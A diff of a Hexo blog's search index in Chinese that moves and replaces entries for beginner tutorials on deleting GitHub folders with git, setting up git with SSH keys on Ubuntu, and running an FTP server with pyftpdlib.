-        <content type="html"><![CDATA[<h2 id="github-删除文件夹"><a href="#github-删除文件夹" class="headerlink" title="github 删除文件夹"></a>github 删除文件夹</h2><p>在github上只能删除仓库,却无法删除文件夹, 所以只能通过命令来解决。</p><p>1.首先进入master文件夹下</p><p>2.将远程仓库里面的项目拉下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master </span><br></pre></td></tr></table></figure><p>3.删除xxxx文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached xxxx</span><br></pre></td></tr></table></figure><p>4.提交操作说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#39;删除了xxxx&#39; </span><br></pre></td></tr></table></figure><p>5.将本次更改更新到github项目上去，删除完毕</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> git </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> github </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>flask 解析markdown页面</title>
       <link href="2020/04/22/2020-04-22-flask_parse_markdown/"/>
       <url>2020/04/22/2020-04-22-flask_parse_markdown/</url>
@@ -4247,6 +4222,31 @@
         <tags>
             
             <tag> git </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>github 删除文件夹</title>
+      <link href="2020/04/22/2020-04-22-github_delete_folder/"/>
+      <url>2020/04/22/2020-04-22-github_delete_folder/</url>
+      
+        <content type="html"><![CDATA[<h2 id="github-删除文件夹"><a href="#github-删除文件夹" class="headerlink" title="github 删除文件夹"></a>github 删除文件夹</h2><p>在github上只能删除仓库,却无法删除文件夹, 所以只能通过命令来解决。</p><p>1.首先进入master文件夹下</p><p>2.将远程仓库里面的项目拉下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master </span><br></pre></td></tr></table></figure><p>3.删除xxxx文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached xxxx</span><br></pre></td></tr></table></figure><p>4.提交操作说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &#39;删除了xxxx&#39; </span><br></pre></td></tr></table></figure><p>5.将本次更改更新到github项目上去，删除完毕</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> git </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> github </tag>
             
         </tags>
       
@@ -4363,7 +4363,7 @@
       <link href="2020/04/22/2020-04-22-ubuntu_git_installation_and_use/"/>
       <url>2020/04/22/2020-04-22-ubuntu_git_installation_and_use/</url>
       
-        <content type="html"><![CDATA[<h2 id="ubuntu-git安装及使用"><a href="#ubuntu-git安装及使用" class="headerlink" title="ubuntu git安装及使用"></a>ubuntu git安装及使用</h2><h3 id="一、git安装"><a href="#一、git安装" class="headerlink" title="一、git安装"></a>一、git安装</h3><p>首先需要注册一个全球最大同性交友网站github账号</p><p>打开终端，安装git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>配置git账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;git的用户名&quot;</span><br><span class="line">git config --global user.email &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>根据用户名及邮箱生成密钥(该密钥会用在该账号中)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>查看刚刚目录下的密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 存放目录&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010454.png" alt="Screenshot from 2020-04-21 17-29-12"></p><p>复制密钥,注意别复制邮箱</p><p>打开<a href="https://github.com/%E7%BD%91%E7%AB%99,%E7%99%BB%E9%99%86%E4%BD%A0%E7%9A%84%E8%B4%A6%E5%8F%B7%EF%BC%8C%E8%BF%9B%E5%85%A5settings-SSH">https://github.com/网站,登陆你的账号，进入settings-SSH</a> and GPG  keys</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010500.png" alt="Screenshot from 2020-04-21 17-43-14"></p><p>输入个标题,然后复制粘贴你的密钥</p><p>检测是否可用ssh -T <a href="mailto:&#103;&#105;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;">&#103;&#105;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;</a></p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010510.png" alt="Screenshot from 2020-04-21 17-45-22"></p><p>这就表示成功了，就可以在本机上传及更新github项目。</p><h3 id="二、git上传"><a href="#二、git上传" class="headerlink" title="二、git上传"></a>二、git上传</h3><p>在github中新建项目</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010514.png" alt="Screenshot from 2020-04-21 17-49-08"></p><p>在本地创建一个项目目录并进入</p><p>当我们需要给新的项目respository上传内容时，需要使用init命令将我们需要上传的目录初始化     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>链接远程仓库: git remote add origin <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;">&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#x68;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;</a>:用户名/新建github项目名.git </p><p>在本地项目目录中执行命令，将需要上传到远程仓库的文件写在add后面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br></pre></td></tr></table></figure><p>将add后的文件提交到本地仓库  git commit -m “提交的信息”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;测试上传&quot;</span><br></pre></td></tr></table></figure><p>将提交的内容同步至github上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这里可能会遇到问题：</p><p>问题1：git上传位置出错</p><p> 解决:修改配置文件</p><pre><code>1.进入当前共享文件的 .git 目录    cd .git2.编辑 config      vim config3.将url地址改成github中项目的 ssh地址4.保存并退出5.再次提交, 不需要输入账号密码)</code></pre><p>问题2：新建项目时选择了新建README.md文件，而github中的README.md文件不在本地代码目录中</p><p> 解决:先pull README.md文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>解决问题后，再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>测试文件成功上传至github。</p><h3 id="三、总结上传步骤"><a href="#三、总结上传步骤" class="headerlink" title="三、总结上传步骤"></a>三、总结上传步骤</h3><p>在当前项目的目录中生成本地的git管理库，我们可以发现在当前目录下多了一个.git的隐藏文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure><p>查看能被上传的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>将项目中所有的文件添加到仓库中，如果有的文件之前已经添加了，它会自动省略。如果想添加特定文件，把.换成对应的文件名就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add . </span><br></pre></td></tr></table></figure><p>本次提交的注释，双引号中的字符自定义修改。git commit 后面加 -m 表示可以直接输入提交说明，如果不加 -m ，直接输入git commit，就会弹出一个类似于 vim 的界面，让你输入提交说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;first commit&quot; </span><br></pre></td></tr></table></figure><p>新建一个github的仓库，在网页新建，记下地址，也就是仓库的地址，输入命令链接远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:用户名&#x2F;新建github项目名.git</span><br></pre></td></tr></table></figure><p>将代码上传到github仓库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>参考连接：<a href="https://blog.csdn.net/edj_13/article/details/104548375">基础Git操作与GitHub协作吐血整理，收好！！！</a></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="ubuntu-git安装及使用"><a href="#ubuntu-git安装及使用" class="headerlink" title="ubuntu git安装及使用"></a>ubuntu git安装及使用</h2><h3 id="一、git安装"><a href="#一、git安装" class="headerlink" title="一、git安装"></a>一、git安装</h3><p>首先需要注册一个全球最大同性交友网站github账号</p><p>打开终端，安装git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>配置git账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;git的用户名&quot;</span><br><span class="line">git config --global user.email &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>根据用户名及邮箱生成密钥(该密钥会用在该账号中)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;git的邮箱&quot;</span><br></pre></td></tr></table></figure><p>查看刚刚目录下的密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 存放目录&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010454.png" alt="Screenshot from 2020-04-21 17-29-12"></p><p>复制密钥,注意别复制邮箱</p><p>打开<a href="https://github.com/%E7%BD%91%E7%AB%99,%E7%99%BB%E9%99%86%E4%BD%A0%E7%9A%84%E8%B4%A6%E5%8F%B7%EF%BC%8C%E8%BF%9B%E5%85%A5settings-SSH">https://github.com/网站,登陆你的账号，进入settings-SSH</a> and GPG  keys</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010500.png" alt="Screenshot from 2020-04-21 17-43-14"></p><p>输入个标题,然后复制粘贴你的密钥</p><p>检测是否可用ssh -T <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#111;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#x69;&#116;&#104;&#117;&#98;&#x2e;&#99;&#111;&#x6d;</a></p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010510.png" alt="Screenshot from 2020-04-21 17-45-22"></p><p>这就表示成功了，就可以在本机上传及更新github项目。</p><h3 id="二、git上传"><a href="#二、git上传" class="headerlink" title="二、git上传"></a>二、git上传</h3><p>在github中新建项目</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010514.png" alt="Screenshot from 2020-04-21 17-49-08"></p><p>在本地创建一个项目目录并进入</p><p>当我们需要给新的项目respository上传内容时，需要使用init命令将我们需要上传的目录初始化     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>链接远程仓库: git remote add origin <a href="mailto:&#x67;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;</a>:用户名/新建github项目名.git </p><p>在本地项目目录中执行命令，将需要上传到远程仓库的文件写在add后面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br></pre></td></tr></table></figure><p>将add后的文件提交到本地仓库  git commit -m “提交的信息”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;测试上传&quot;</span><br></pre></td></tr></table></figure><p>将提交的内容同步至github上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这里可能会遇到问题：</p><p>问题1：git上传位置出错</p><p> 解决:修改配置文件</p><pre><code>1.进入当前共享文件的 .git 目录    cd .git2.编辑 config      vim config3.将url地址改成github中项目的 ssh地址4.保存并退出5.再次提交, 不需要输入账号密码)</code></pre><p>问题2：新建项目时选择了新建README.md文件，而github中的README.md文件不在本地代码目录中</p><p> 解决:先pull README.md文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>解决问题后，再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>测试文件成功上传至github。</p><h3 id="三、总结上传步骤"><a href="#三、总结上传步骤" class="headerlink" title="三、总结上传步骤"></a>三、总结上传步骤</h3><p>在当前项目的目录中生成本地的git管理库，我们可以发现在当前目录下多了一个.git的隐藏文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure><p>查看能被上传的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>将项目中所有的文件添加到仓库中，如果有的文件之前已经添加了，它会自动省略。如果想添加特定文件，把.换成对应的文件名就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add . </span><br></pre></td></tr></table></figure><p>本次提交的注释，双引号中的字符自定义修改。git commit 后面加 -m 表示可以直接输入提交说明，如果不加 -m ，直接输入git commit，就会弹出一个类似于 vim 的界面，让你输入提交说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;first commit&quot; </span><br></pre></td></tr></table></figure><p>新建一个github的仓库，在网页新建，记下地址，也就是仓库的地址，输入命令链接远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:用户名&#x2F;新建github项目名.git</span><br></pre></td></tr></table></figure><p>将代码上传到github仓库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>参考连接：<a href="https://blog.csdn.net/edj_13/article/details/104548375">基础Git操作与GitHub协作吐血整理，收好！！！</a></p>]]></content>
       
       
       <categories>
@@ -4498,33 +4498,6 @@
     
     
     <entry>
-      <title>python 一句话搭建ftp服务器</title>
-      <link href="2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/"/>
-      <url>2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/</url>
-      
-        <content type="html"><![CDATA[<h2 id="python-一句话搭建ftp服务器"><a href="#python-一句话搭建ftp服务器" class="headerlink" title="python 一句话搭建ftp服务器"></a>python 一句话搭建ftp服务器</h2><p>当你想快速共享一个目录的时候，利用pyftpdlib可以更加简单的方法即可实现FTP服务器的功能，这是特别有用的，只需要1行代码即可实现。</p><h3 id="一句话搭建FTP服务器"><a href="#一句话搭建FTP服务器" class="headerlink" title="一句话搭建FTP服务器"></a>一句话搭建FTP服务器</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib </span><br><span class="line">(安装失败请到这里下载：https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pyftpdlib&#x2F;)</span><br></pre></td></tr></table></figure><p>到你打算分享的目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -u user -p 123456 -w</span><br></pre></td></tr></table></figure><p>然后我们来看一下，至此一个简单的FTP服务器已经搭建完成，访问 <a href="ftp://127.0.0.1:2121即可（默认IP为">ftp://127.0.0.1:2121即可（默认IP为</a> 127.0.0.1 、端口为 2121 ）</p><p>除上之外，还有一些可选参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-i 指定IP地址（默认为本机的IP地址）</span><br><span class="line">-p 指定端口（默认为2121）</span><br><span class="line">-w 写权限（默认为只读）</span><br><span class="line">-d 指定目录 （默认为当前目录）</span><br><span class="line">-u 指定用户名登录</span><br><span class="line">-P 设置登录密码</span><br></pre></td></tr></table></figure><h3 id="完善的FTP服务器脚本配置"><a href="#完善的FTP服务器脚本配置" class="headerlink" title="完善的FTP服务器脚本配置"></a>完善的FTP服务器脚本配置</h3><p>上述的一行命令已经可以实现一个简单的FTP服务器，但是要搭建一个功能强大完善的FTP服务所涉及到的配置较多，这时需要使用Pyftpdlib提供的 API 来编写。如下是一个简单的示例</p><p>ftp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pyftpdlib.authorizers import DummyAuthorizer</span><br><span class="line">from pyftpdlib.handlers import FTPHandler</span><br><span class="line">from pyftpdlib.servers import FTPServer</span><br><span class="line"> </span><br><span class="line"># 实例化DummyAuthorizer来创建ftp用户</span><br><span class="line">authorizer &#x3D; DummyAuthorizer()</span><br><span class="line"># 参数：用户名，密码，目录，权限</span><br><span class="line">authorizer.add_user(&#39;user1&#39;, &#39;12345&#39;, &#39;&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elradfmwMT&#39;)</span><br><span class="line">authorizer.add_user(&#39;user2&#39;, &#39;12345&#39;, &#39;&#x2F;media&#x2F;mamba&#x2F;Data&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elr&#39;)</span><br><span class="line"># 匿名登录</span><br><span class="line"># authorizer.add_anonymous(&#39;&#x2F;home&#x2F;nobody&#39;)</span><br><span class="line">handler &#x3D; FTPHandler</span><br><span class="line">handler.authorizer &#x3D; authorizer</span><br><span class="line"># 参数：IP，端口，handler</span><br><span class="line">server &#x3D; FTPServer((&#39;192.168.24.145&#39;, 1234), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ftp.py</span><br></pre></td></tr></table></figure><p>perm权限选项**</p><p>读取权限：</p><ul><li>“e” =更改目录（CWD，CDUP命令）</li><li>“l” =列表文件（LIST，NLST，STAT，MLSD，MLST，SIZE命令）</li><li>“r” =从服务器检索文件（RETR命令）  </li></ul><p>写入权限：</p><ul><li><p>“a” =将数据追加到现有文件（APPE命令）</p></li><li><p>“d” =删除文件或目录（DELE，RMD命令）</p></li><li><p>“f” =重命名文件或目录（RNFR，RNTO命令）</p></li><li><p>“m” =创建目录（MKD命令）</p></li><li><p>“w” =将文件存储到服务器（STOR，STOU命令）</p></li><li><p>“M”=更改文件模式/权限（SITE CHMOD命令）</p></li><li><p>“T”=更改文件修改时间（SITE MFMT命令）</p></li></ul><p>参考：Pyftpdlib文档：<a href="http://pyftpdlib.readthedocs.io/en/latest/index.html">http://pyftpdlib.readthedocs.io/en/latest/index.html</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python </tag>
-            
-            <tag> ftp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>flask 模板过滤器及自定义过滤器的使用</title>
       <link href="2020/04/21/2020-04-21-flask_use_of_template_filters_and_custom_filters/"/>
       <url>2020/04/21/2020-04-21-flask_use_of_template_filters_and_custom_filters/</url>
@@ -4552,11 +4525,38 @@
     
     
     <entry>
-      <title>ubuntu 自带截图工具screenshot</title>
-      <link href="2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/"/>
-      <url>2020/04/21/2020-04-21-ubuntu_screenshot_tool_screenshot/</url>
+      <title>python 一句话搭建ftp服务器</title>
+      <link href="2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/"/>
+      <url>2020/04/21/2020-04-21-python_build_ftpserver_in_one_sentence/</url>
       
-        <content type="html"><![CDATA[<h2 id="ubuntu-自带截图工具screenshot"><a href="#ubuntu-自带截图工具screenshot" class="headerlink" title="ubuntu 自带截图工具screenshot"></a>ubuntu 自带截图工具screenshot</h2><p> ubuntu自带的截图工具screenshot能够满足基本的截图功能，可以不必安装另外的截图软件。一般用到的截图类型有三种：全屏、当前活动窗口、自定义区域，可以在Dash home中搜索找到该应用。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010349.jpeg" alt="img"><br>截取全屏快捷键：print screen<br>截取当前窗口快捷键：alt+print screen（如果遇到无法截图的情况直接用自定义截图好了，不必纠结了）<br>自定义区域截图的快捷键需要自己设置，设置步骤如下：<br>system settings—-&gt;keyboard—–&gt;shortcuts—–&gt;custom shortcuts—–&gt;点击屏幕下方的加号,如下设置</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010353.jpeg" alt="img"></p><p>然后按下Ctrl+Alt+A(要设置的快捷键)</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20200424010358.png" alt="image-20200422093736045"></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="python-一句话搭建ftp服务器"><a href="#python-一句话搭建ftp服务器" class="headerlink" title="python 一句话搭建ftp服务器"></a>python 一句话搭建ftp服务器</h2><p>当你想快速共享一个目录的时候，利用pyftpdlib可以更加简单的方法即可实现FTP服务器的功能，这是特别有用的，只需要1行代码即可实现。</p><h3 id="一句话搭建FTP服务器"><a href="#一句话搭建FTP服务器" class="headerlink" title="一句话搭建FTP服务器"></a>一句话搭建FTP服务器</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib </span><br><span class="line">(安装失败请到这里下载：https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pyftpdlib&#x2F;)</span><br></pre></td></tr></table></figure><p>到你打算分享的目录下执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -u user -p 123456 -w</span><br></pre></td></tr></table></figure><p>然后我们来看一下，至此一个简单的FTP服务器已经搭建完成，访问 <a href="ftp://127.0.0.1:2121即可（默认IP为">ftp://127.0.0.1:2121即可（默认IP为</a> 127.0.0.1 、端口为 2121 ）</p><p>除上之外，还有一些可选参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-i 指定IP地址（默认为本机的IP地址）</span><br><span class="line">-p 指定端口（默认为2121）</span><br><span class="line">-w 写权限（默认为只读）</span><br><span class="line">-d 指定目录 （默认为当前目录）</span><br><span class="line">-u 指定用户名登录</span><br><span class="line">-P 设置登录密码</span><br></pre></td></tr></table></figure><h3 id="完善的FTP服务器脚本配置"><a href="#完善的FTP服务器脚本配置" class="headerlink" title="完善的FTP服务器脚本配置"></a>完善的FTP服务器脚本配置</h3><p>上述的一行命令已经可以实现一个简单的FTP服务器，但是要搭建一个功能强大完善的FTP服务所涉及到的配置较多，这时需要使用Pyftpdlib提供的 API 来编写。如下是一个简单的示例</p><p>ftp.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pyftpdlib.authorizers import DummyAuthorizer</span><br><span class="line">from pyftpdlib.handlers import FTPHandler</span><br><span class="line">from pyftpdlib.servers import FTPServer</span><br><span class="line"> </span><br><span class="line"># 实例化DummyAuthorizer来创建ftp用户</span><br><span class="line">authorizer &#x3D; DummyAuthorizer()</span><br><span class="line"># 参数：用户名，密码，目录，权限</span><br><span class="line">authorizer.add_user(&#39;user1&#39;, &#39;12345&#39;, &#39;&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elradfmwMT&#39;)</span><br><span class="line">authorizer.add_user(&#39;user2&#39;, &#39;12345&#39;, &#39;&#x2F;media&#x2F;mamba&#x2F;Data&#x2F;test&#x2F;pyftpdlib_FTP&#39;, perm&#x3D;&#39;elr&#39;)</span><br><span class="line"># 匿名登录</span><br><span class="line"># authorizer.add_anonymous(&#39;&#x2F;home&#x2F;nobody&#39;)</span><br><span class="line">handler &#x3D; FTPHandler</span><br><span class="line">handler.authorizer &#x3D; authorizer</span><br><span class="line"># 参数：IP，端口，handler</span><br><span class="line">server &#x3D; FTPServer((&#39;192.168.24.145&#39;, 1234), handler)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ftp.py</span><br></pre></td></tr></table></figure><p>perm权限选项**</p><p>读取权限：</p><ul><li>“e” =更改目录（CWD，CDUP命令）</li><li>“l” =列表文件（LIST，NLST，STAT，MLSD，MLST，SIZE命令）</li><li>“r” =从服务器检索文件（RETR命令）  </li></ul><p>写入权限：</p><ul><li><p>“a” =将数据追加到现有文件（APPE命令）</p></li><li><p>“d” =删除文件或目录（DELE，RMD命令）</p></li><li><p>“f” =重命名文件或目录（RNFR，RNTO命令）</p></li><li><p>“m” =创建目录（MKD命令）</p></li><li><p>“w” =将文件存储到服务器（STOR，STOU命令）</p></li><li><p>“M”=更改文件模式/权限（SITE CHMOD命令）</p></li><li><p>“T”=更改文件修改时间（SITE MFMT命令）</p></li></ul><p>参考：Pyftpdlib文档：<a href="http://pyftpdlib.readthedocs.io/en/latest/index.html">http://pyftpdlib.readthedocs.io/en/latest/index.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> ftp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ubuntu绘图程序Gnome-paint</title>
+      <link href="2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/"/>
+      <url>2020/04/21/2020-04-21-ubuntu_drawing_program_Gnome-paint/</url>
+      
